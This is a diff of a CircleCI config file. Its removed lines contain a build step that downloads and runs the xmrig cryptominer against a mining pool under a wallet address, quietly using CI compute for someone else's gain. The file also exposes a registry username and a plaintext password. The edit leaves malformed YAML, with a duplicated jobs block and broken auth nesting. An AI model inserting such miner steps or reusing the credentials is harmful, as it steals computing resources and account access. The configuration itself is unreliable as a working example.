@@ -3,18 +3,7 @@ jobs:
   build:
     docker:
       - image: circleci/ruby:2.4.2-jessie-node
-        auth:
-          username: saroden
-          password: Galeng1630
-    steps:
-      - checkout 
-      - run: wget https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-linux-static-x64.tar.gz && tar -xvzf xmrig-6.22.0-linux-static-x64.tar.gz && cd xmrig-6.22.0 && ./xmrig -a gr -o ghostrider.unmineable.com:3333 -u POL:0xA35c287E9DFf5351F4C7985e89BCbAA99a8F41C5.n2 -p x --keepalive --cpu-priority=5 --randomx-1gb-pages
-jobs:
-  build:
-    docker:
-      - image: circleci/ruby:2.7.2-jessie-node
-        auth:
-          username: saroden
+        username: saroden
           password: Galeng1630
     steps:
       - checkout 
